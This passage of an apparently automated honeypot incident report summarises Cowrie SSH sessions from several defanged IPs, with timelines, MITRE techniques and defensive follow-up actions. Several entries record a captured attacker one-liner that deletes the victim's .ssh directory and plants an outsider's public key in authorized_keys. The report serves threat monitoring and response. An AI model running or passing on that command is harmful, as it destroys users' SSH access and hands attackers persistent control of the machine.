| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:17:08` | `cowrie.session.connect` |
| `2026-06-13 05:17:08` | `cowrie.client.version` |
| `2026-06-13 05:17:09` | `cowrie.client.kex` |
| `2026-06-13 05:17:09` | `cowrie.login.success` |
| `2026-06-13 05:17:09` | `cowrie.session.params` |
| `2026-06-13 05:17:09` | `cowrie.command.input` |
| `2026-06-13 05:17:09` | `cowrie.command.failed` |
| `2026-06-13 05:17:09` | `cowrie.log.closed` |
| `2026-06-13 05:17:09` | `cowrie.session.params` |
| `2026-06-13 05:17:09` | `cowrie.command.input` |
| `2026-06-13 05:17:09` | `cowrie.session.file_download` |
| `2026-06-13 05:17:09` | `cowrie.log.closed` |
| `2026-06-13 05:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2caf024bfcba

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:17 |
| **Last Seen** | 2026-06-13 05:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:17:11` | `cowrie.session.connect` |
| `2026-06-13 05:17:11` | `cowrie.client.version` |
| `2026-06-13 05:17:11` | `cowrie.client.kex` |
| `2026-06-13 05:17:11` | `cowrie.login.success` |
| `2026-06-13 05:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fea3193d93b5

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:20 |
| **Last Seen** | 2026-06-13 05:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:20:44` | `cowrie.session.connect` |
| `2026-06-13 05:20:44` | `cowrie.client.version` |
| `2026-06-13 05:20:44` | `cowrie.client.kex` |
| `2026-06-13 05:20:44` | `cowrie.login.success` |
| `2026-06-13 05:20:44` | `cowrie.session.params` |
| `2026-06-13 05:20:44` | `cowrie.command.input` |
| `2026-06-13 05:20:44` | `cowrie.command.failed` |
| `2026-06-13 05:20:44` | `cowrie.log.closed` |
| `2026-06-13 05:20:44` | `cowrie.session.params` |
| `2026-06-13 05:20:44` | `cowrie.command.input` |
| `2026-06-13 05:20:44` | `cowrie.session.file_download` |
| `2026-06-13 05:20:44` | `cowrie.log.closed` |
| `2026-06-13 05:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8132bf41566

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:20 |
| **Last Seen** | 2026-06-13 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:20:46` | `cowrie.session.connect` |
| `2026-06-13 05:20:46` | `cowrie.client.version` |
| `2026-06-13 05:20:46` | `cowrie.client.kex` |
| `2026-06-13 05:20:46` | `cowrie.login.success` |
| `2026-06-13 05:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7228c19f6b

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:21 |
| **Last Seen** | 2026-06-13 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:21:04` | `cowrie.session.connect` |
| `2026-06-13 05:21:04` | `cowrie.client.version` |
| `2026-06-13 05:21:04` | `cowrie.client.kex` |
| `2026-06-13 05:21:05` | `cowrie.login.success` |
| `2026-06-13 05:21:05` | `cowrie.session.params` |
| `2026-06-13 05:21:05` | `cowrie.command.input` |
| `2026-06-13 05:21:05` | `cowrie.command.failed` |
| `2026-06-13 05:21:05` | `cowrie.log.closed` |
| `2026-06-13 05:21:05` | `cowrie.session.params` |
| `2026-06-13 05:21:05` | `cowrie.command.input` |
| `2026-06-13 05:21:05` | `cowrie.session.file_download` |
| `2026-06-13 05:21:05` | `cowrie.log.closed` |
| `2026-06-13 05:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed6bbcb2fd7

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:21 |
| **Last Seen** | 2026-06-13 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:21:07` | `cowrie.session.connect` |
| `2026-06-13 05:21:07` | `cowrie.client.version` |
| `2026-06-13 05:21:07` | `cowrie.client.kex` |
| `2026-06-13 05:21:08` | `cowrie.login.success` |
| `2026-06-13 05:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993783283d59

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:26 |
| **Last Seen** | 2026-06-13 05:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:26:25` | `cowrie.session.connect` |
| `2026-06-13 05:26:25` | `cowrie.client.version` |
| `2026-06-13 05:26:25` | `cowrie.client.kex` |
| `2026-06-13 05:26:25` | `cowrie.login.success` |
| `2026-06-13 05:26:26` | `cowrie.session.params` |
| `2026-06-13 05:26:26` | `cowrie.command.input` |
| `2026-06-13 05:26:26` | `cowrie.command.failed` |
| `2026-06-13 05:26:26` | `cowrie.log.closed` |
| `2026-06-13 05:26:26` | `cowrie.session.params` |
| `2026-06-13 05:26:26` | `cowrie.command.input` |
| `2026-06-13 05:26:26` | `cowrie.session.file_download` |
| `2026-06-13 05:26:26` | `cowrie.log.closed` |
| `2026-06-13 05:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e7891f648d3

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:26 |
| **Last Seen** | 2026-06-13 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:26:27` | `cowrie.session.connect` |
| `2026-06-13 05:26:27` | `cowrie.client.version` |
| `2026-06-13 05:26:27` | `cowrie.client.kex` |
| `2026-06-13 05:26:28` | `cowrie.login.success` |
| `2026-06-13 05:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09465567c53c

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:26 |
| **Last Seen** | 2026-06-13 05:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:26:54` | `cowrie.session.connect` |
| `2026-06-13 05:26:54` | `cowrie.client.version` |
| `2026-06-13 05:26:54` | `cowrie.client.kex` |
| `2026-06-13 05:26:54` | `cowrie.login.success` |
| `2026-06-13 05:26:54` | `cowrie.session.params` |
| `2026-06-13 05:26:54` | `cowrie.command.input` |
| `2026-06-13 05:26:54` | `cowrie.command.failed` |
| `2026-06-13 05:26:55` | `cowrie.log.closed` |
| `2026-06-13 05:26:55` | `cowrie.session.params` |
| `2026-06-13 05:26:55` | `cowrie.command.input` |
| `2026-06-13 05:26:55` | `cowrie.session.file_download` |
| `2026-06-13 05:26:55` | `cowrie.log.closed` |
| `2026-06-13 05:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72c9ae7c833c

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:26 |
| **Last Seen** | 2026-06-13 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:26:57` | `cowrie.session.connect` |
| `2026-06-13 05:26:57` | `cowrie.client.version` |
| `2026-06-13 05:26:57` | `cowrie.client.kex` |
| `2026-06-13 05:26:57` | `cowrie.login.success` |
| `2026-06-13 05:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-785d2c21e0c5

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:28 |
| **Last Seen** | 2026-06-13 05:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:28:18` | `cowrie.session.connect` |
| `2026-06-13 05:28:18` | `cowrie.client.version` |
| `2026-06-13 05:28:18` | `cowrie.client.kex` |
| `2026-06-13 05:28:18` | `cowrie.login.success` |
| `2026-06-13 05:28:19` | `cowrie.session.params` |
| `2026-06-13 05:28:19` | `cowrie.command.input` |
| `2026-06-13 05:28:19` | `cowrie.command.failed` |
| `2026-06-13 05:28:19` | `cowrie.log.closed` |
| `2026-06-13 05:28:19` | `cowrie.session.params` |
| `2026-06-13 05:28:19` | `cowrie.command.input` |
| `2026-06-13 05:28:19` | `cowrie.session.file_download` |
| `2026-06-13 05:28:19` | `cowrie.log.closed` |
| `2026-06-13 05:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ced4f2284f3

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:28 |
| **Last Seen** | 2026-06-13 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:28:20` | `cowrie.session.connect` |
| `2026-06-13 05:28:20` | `cowrie.client.version` |
| `2026-06-13 05:28:20` | `cowrie.client.kex` |
| `2026-06-13 05:28:21` | `cowrie.login.success` |
| `2026-06-13 05:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c11a3013aa

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:34 |
| **Last Seen** | 2026-06-13 05:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:34:55` | `cowrie.session.connect` |
| `2026-06-13 05:34:55` | `cowrie.client.version` |
| `2026-06-13 05:34:55` | `cowrie.client.kex` |
| `2026-06-13 05:34:56` | `cowrie.login.success` |
| `2026-06-13 05:34:56` | `cowrie.session.params` |
| `2026-06-13 05:34:56` | `cowrie.command.input` |
| `2026-06-13 05:34:56` | `cowrie.command.failed` |
| `2026-06-13 05:34:56` | `cowrie.log.closed` |
| `2026-06-13 05:34:56` | `cowrie.session.params` |
| `2026-06-13 05:34:56` | `cowrie.command.input` |
| `2026-06-13 05:34:57` | `cowrie.session.file_download` |
| `2026-06-13 05:34:57` | `cowrie.log.closed` |
| `2026-06-13 05:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61a726238707

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:34 |
| **Last Seen** | 2026-06-13 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:34:58` | `cowrie.session.connect` |
| `2026-06-13 05:34:58` | `cowrie.client.version` |
| `2026-06-13 05:34:58` | `cowrie.client.kex` |
| `2026-06-13 05:34:59` | `cowrie.login.success` |
| `2026-06-13 05:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e2431fd40f

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-06-13 05:44 |
| **Last Seen** | 2026-06-13 05:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:44:03` | `cowrie.session.connect` |
| `2026-06-13 05:44:04` | `cowrie.client.version` |
| `2026-06-13 05:44:04` | `cowrie.client.kex` |
| `2026-06-13 05:44:05` | `cowrie.login.success` |
| `2026-06-13 05:44:06` | `cowrie.direct-tcpip.request` |
| `2026-06-13 05:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-839597fa205c

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:45 |
| **Last Seen** | 2026-06-13 05:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:45:13` | `cowrie.session.connect` |
| `2026-06-13 05:45:13` | `cowrie.client.version` |
| `2026-06-13 05:45:13` | `cowrie.client.kex` |
| `2026-06-13 05:45:14` | `cowrie.login.success` |
| `2026-06-13 05:45:14` | `cowrie.session.params` |
| `2026-06-13 05:45:14` | `cowrie.command.input` |
| `2026-06-13 05:45:14` | `cowrie.command.failed` |
| `2026-06-13 05:45:14` | `cowrie.log.closed` |
| `2026-06-13 05:45:15` | `cowrie.session.params` |
| `2026-06-13 05:45:15` | `cowrie.command.input` |
| `2026-06-13 05:45:15` | `cowrie.session.file_download` |
| `2026-06-13 05:45:15` | `cowrie.log.closed` |
| `2026-06-13 05:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e17c574cee90

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:45 |
| **Last Seen** | 2026-06-13 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:45:17` | `cowrie.session.connect` |
| `2026-06-13 05:45:17` | `cowrie.client.version` |
| `2026-06-13 05:45:17` | `cowrie.client.kex` |
| `2026-06-13 05:45:18` | `cowrie.login.success` |
| `2026-06-13 05:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b15ddfbf7e

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-06-13 05:46 |
| **Last Seen** | 2026-06-13 05:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:46:18` | `cowrie.session.connect` |
| `2026-06-13 05:46:19` | `cowrie.client.version` |
| `2026-06-13 05:46:19` | `cowrie.client.kex` |
| `2026-06-13 05:46:21` | `cowrie.login.success` |
